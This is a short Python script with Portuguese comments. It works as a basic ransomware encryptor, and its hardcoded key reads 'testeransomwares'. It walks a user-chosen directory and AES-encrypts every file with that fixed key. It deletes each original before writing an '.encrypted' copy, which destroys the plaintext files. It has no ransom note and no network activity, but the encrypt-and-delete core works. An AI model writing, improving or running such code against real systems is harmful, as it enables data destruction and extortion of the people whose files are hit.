import os
import pyaes

# Função para criptografar um único arquivo
def encrypt_file(file_path, encryption_key):
    try:
        # Abrir o arquivo no modo leitura binária
        with open(file_path, "rb") as file:
            file_data = file.read()
        
        # Remover o arquivo original
        os.remove(file_path)
        
        # Inicializar a criptografia AES
        aes = pyaes.AESModeOfOperationCTR(encryption_key)
        
        # Criptografar o conteúdo do arquivo
        crypto_data = aes.encrypt(file_data)
        
        # Salvar o arquivo criptografado
        new_file_path = file_path + ".encrypted"
        with open(new_file_path, "wb") as encrypted_file:
            encrypted_file.write(crypto_data)
        
        print(f"Arquivo criptografado: {file_path} -> {new_file_path}")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_path}: {e}")

# Função para criptografar todos os arquivos em um diretório
def encrypt_directory(directory_path, encryption_key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Evitar recriptografar arquivos já criptografados
            if not file_path.endswith(".encrypted"):
                encrypt_file(file_path, encryption_key)

# Função principal
def main():
    # Diretório alvo para criptografar os arquivos
    target_directory = input("Digite o diretório alvo para criptografar os arquivos: ").strip()
    
    # Verificar se o diretório existe
    if not os.path.isdir(target_directory):
        print("Diretório não encontrado!")
        return
    
    # Chave de criptografia (deve ter 16, 24 ou 32 bytes)
    encryption_key = b"testeransomwares"  # Deve ter o mesmo tamanho em todos os usos
    
    # Iniciar o processo de criptografia
    encrypt_directory(target_directory, encryption_key)
    print("Criptografia concluída!")

if __name__ == "__main__":
    main()
